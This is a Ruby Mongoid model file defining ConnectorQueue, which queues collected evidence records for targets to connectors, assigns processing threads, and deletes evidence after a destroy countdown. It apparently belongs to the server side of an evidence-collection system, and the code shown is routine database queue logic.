require_relative 'connector'

class ConnectorQueue
  include Mongoid::Document
  extend RCS::Tracer
  include RCS::Tracer

  field :cid,   as: :connector_id,  type: Moped::BSON::ObjectId
  field :d,     as: :data,          type: Hash, default: {}
  field :t,     as: :thread,        type: Symbol

  store_in collection: 'connector_queue'

  validates_presence_of  :data
  validates_presence_of  :connector_id
  validates_presence_of  :thread

  index({connector_id: 1, thread: 1})

  scope :with_connector, lambda { |connector| where(connector_id: connector.id) }

  after_destroy :evidence_destroy_countdown

  def evidence_destroy_countdown
    return unless evidence
    return unless evidence['destroy_countdown']

    if evidence.inc(:destroy_countdown, -1) <= 0
      trace :debug, "Destroying evidence #{evidence.id} because of destroy countdown reached"
      evidence.destroy
    end
  end

  def evidence
    @evidence ||= begin
      return unless data['target_id']
      ::Evidence.collection_class(data['target_id']).where(id: data['evidence_id']).first
    end
  end

  def connector
    @connector ||= Connector.where(id: connector_id).first
  end

  def to_s
    "<#ConnectorQueue #{id}: connector_id=#{connector_id}, data=#{data.inspect}>"
  end

  def self.size
    all.count
  end

  def self.take(thread = nil)
    filter = thread ? {thread: thread} : {}
    where(filter).first
  end

  def self.push_evidence(connector, target, evidence)
    fullpath = target.path + [evidence.aid]
    data = {evidence_id: evidence.id, target_id: target.id, path: fullpath}
    push(connector, data)
  end

  def self.push(connector, data)
    trace :debug, "Adding to ConnectorQueue: #{connector.id}, #{data.inspect}"
    thread = connector.type == :archive ? connector.data['addr'].to_sym : :default
    attributes = {connector_id: connector.id, data: data, thread: thread}
    create!(attributes)
  end
end
